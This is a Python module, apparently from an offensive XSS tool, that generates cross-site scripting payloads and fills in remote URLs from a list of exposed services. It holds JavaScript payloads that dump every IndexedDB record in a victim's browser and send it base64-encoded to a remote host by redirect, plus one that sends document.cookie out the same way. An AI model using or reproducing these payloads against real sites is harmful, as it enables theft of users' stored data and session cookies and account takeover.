import xssbase.lib.var as var
import xssbase.lib.logger as log
import pprint
import json 

pp = pprint.PrettyPrinter(indent=4)


def router(args):
	args=args.split()
	minified=False
	exposed=False
	local=False
	payloads=[]
	payload=""
	payloadFind=False

	if("minified" in args or "mini" in args):
		minified=True

	if("local" in args):
		local=True

	if("exposed" in args):
		exposed=True

	for arg in args: 
		if(arg.upper() in PAYLOAD):
			payloadFind=True
			payload=PAYLOAD[arg.upper()]

	if(not payloadFind):
		payloadAvailable=PAYLOAD.keys()
		print(', '.join([k.lower() for k in PAYLOAD.keys()]))

	#Define payload
	# if('firebase' in args):
	# 	payload=PAYLOAD_FIREBASE

	if(local):
		pass
		#process only for local 
	elif(exposed):
		for url in var.var_exposedServices:
			log.payload(url)
			payloads.append(payload.replace("TO_REPLACE",url))
	else:
		url=""
		payloads.append(payload.replace("TO_REPLACE",url))

	for payload in payloads:
		if(minified):
			log.payload(minify(payload))
		else:
			log.payload(payload)	
	return 

def minify(payload):
	payload=payload.replace("\t","");
	payload=payload.replace("\r","");
	payload=payload.replace("\n","");
	return payload

PAYLOAD={}

PAYLOAD['FIREBASE'] = """
	var REMOTE_URL="TO_REPLACE";
	indexedDB.databases().then(d =>{
		d.forEach(db=>{
			var DB_NAME=db.name;
			var DB_VERSION=db.version;
			var open=window.indexedDB.open(DB_NAME,DB_VERSION);
			open.onsuccess = function(){
				console.log("Db Opened");
				var db = open.result;
				var transaction = db.transaction(db.objectStoreNames[0],"readwrite");
				var internalStoreName=transaction.objectStoreNames[0];
				var store = transaction.objectStore(internalStoreName);
				var allKeys = store.getAllKeys();
				allKeys.onsuccess =function(o){
					for (var i = allKeys.result.length - 1; i<=allKeys.result.length; i++) {
					 	let key=allKeys.result[i];
					 	if(key!=undefined){
						 	try{
						 		var getResults = store.get(key);
					 			getResults.onsuccess=function(){
					 				toSend=btoa(JSON.stringify(getResults.result));
					 				window.location.href='REMOTE_URL'+'/success/'+toSend
					 			}
						 	}catch(err){
						 		toSend=btoa(JSON.stringify(err));
					 			window.location.href='REMOTE_URL'+'/error/'+toSend
						 	}
					 	}
					}
				}
			}
		});
	});
"""

PAYLOAD['GENERIC']="""
<script>window.location.href='TO_REPLACE'</script>
"""

PAYLOAD['GENERIC_COOKIES_GET']="""
<script>window.location.href='TO_REPLACE'+'/'+btoa(document.cookie)</script>
"""